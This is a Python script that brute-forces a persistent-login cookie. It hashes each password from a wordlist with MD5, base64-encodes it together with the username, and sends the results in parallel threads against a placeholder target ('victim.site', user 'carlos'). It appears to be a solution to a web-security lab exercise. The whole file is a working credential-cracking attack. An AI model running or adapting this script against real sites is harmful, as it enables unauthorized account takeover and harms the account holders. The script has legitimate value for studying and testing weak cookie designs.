import base64
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor

def generate_cookie(username, password):
    # Combine username and password and apply md5 hash
    hashed_password = hashlib.md5(password.encode()).hexdigest()

    # Combine username and hashed_password and encode in base64
    encoded_cookie = base64.b64encode(f"{username}:{hashed_password}".encode()).decode()

    return encoded_cookie

def check_password(password):
    global url, username

    cookie = generate_cookie(username, password)
    headers = {
        "Cookie": f"stay-logged-in={cookie}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
        # Add other headers if necessary
    }

    # Send the request
    response = requests.get(url, headers=headers)

    # Check if the response indicates successful authentication
    if "Your username is:" in response.text:
        print(f"Successfully authenticated with password: {password}")
        return password
    else:
        print(f"Authentication failed with password: {password}")
        return None

def main():
    # Set the target URL
    global url, username
    url = "https://victim.site/my-account?id=carlos"

    # Set the username
    username = "carlos"

    # Load your password wordlist from a file or any other source
    # Replace "passwords.txt" with the actual path to your wordlist file
    with open("passwords.txt", "r") as file:
        passwords = [line.strip() for line in file]

    # Use ThreadPoolExecutor to parallelize the password checking
    with ThreadPoolExecutor(max_workers=10) as executor:
        for result in executor.map(check_password, passwords):
            if result is not None:
                print(f"Exiting program. Valid password found: {result}")
                executor.shutdown(wait=False)
                break

if __name__ == "__main__":
    main()
